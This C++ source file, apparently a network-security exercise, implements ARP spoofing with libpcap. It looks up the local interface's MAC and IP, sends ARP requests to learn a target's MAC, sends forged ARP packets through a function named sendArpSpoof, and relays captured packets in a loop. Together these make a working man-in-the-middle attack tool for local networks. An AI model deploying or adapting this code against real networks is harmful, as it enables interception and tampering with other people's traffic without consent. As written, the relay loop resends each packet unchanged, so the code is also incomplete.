#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include <net/if.h>
#include "arphdr.h"
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include "getPacket.h"
#define MAC_SIZE 6

void printError(const char* message) {
    fprintf(stderr, "%s - %s\n", message, strerror(errno));
}

int setInterfaceAddress(const char* dev, EthArpPacket& packet, bool setMac) {
    struct ifreq ifr;
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        printError("Failed to open socket");
        return -1;
    }

    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (setMac) {
        if (ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0) {
            printError("Failed to get MAC address");
            close(sockfd);
            return -1;
        }
        memcpy(&packet.eth_.smac_, ifr.ifr_hwaddr.sa_data, MAC_SIZE);
        memcpy(&packet.arp_.smac_, ifr.ifr_hwaddr.sa_data, MAC_SIZE);
    } else {
        if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0) {
            printError("Failed to get IP address");
            close(sockfd);
            return -1;
        }
        packet.arp_.sip_ = ((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr;
    }

    close(sockfd);
    return 0;
}

int getMyMac(const char* dev, EthArpPacket& packet) {
    return setInterfaceAddress(dev, packet, true);
}

int getMyIp(const char* dev, EthArpPacket& packet) {
    return setInterfaceAddress(dev, packet, false);
}
bool getSenderMac(pcap_t* handle, EthArpPacket &packet) {
    
    if (pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket)) != 0) {
        fprintf(stderr, "Failed to send packet: %s\n", pcap_geterr(handle));
        return false;
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* responsePacket;
        int res = pcap_next_ex(handle, &header, &responsePacket);
        if (res == 0) continue; // Timeout
        if (res == -1 || res == -2) {
            fprintf(stderr, "Failed to read packet: %s\n", pcap_geterr(handle));
            return false;
        }
        
        EthArpPacket* recvPacket = reinterpret_cast<EthArpPacket*>(const_cast<u_char*>(responsePacket));
        if (ntohs(recvPacket->eth_.type_) != EthHdr::Arp || ntohs(recvPacket->arp_.op_) != ArpHdr::Reply || recvPacket->arp_.sip_ != packet.arp_.tip_) continue;
        
        memcpy(&packet.arp_.tmac_, &recvPacket->arp_.smac_, MAC_SIZE); 
        memcpy(&packet.eth_.dmac_, &recvPacket->eth_.smac_, MAC_SIZE);
        return true;
    }
}

bool sendArpSpoof(pcap_t* handle, EthArpPacket &packet) {
    if (pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket)) != 0) {
        fprintf(stderr, "pcap_sendpacket failed: %s\n", pcap_geterr(handle));
        return false;
    }
    return true;
}


void relay_packet(pcap_t* handle) {
    while (true) {
        struct pcap_pkthdr* header;   
        const u_char *packet;       
        
        int result = pcap_next_ex(handle, &header, &packet);
        if (result <= 0) { 
            if (result == -1) { // error
                fprintf(stderr, "Error reading packet: %s\n", pcap_geterr(handle));
            }
            // timeout -> retry
            continue;
        }
        if (pcap_sendpacket(handle, packet, header->len) != 0) {
            fprintf(stderr,"\nError sending the packet: %s\n", pcap_geterr(handle));
            break;
        }
    }
}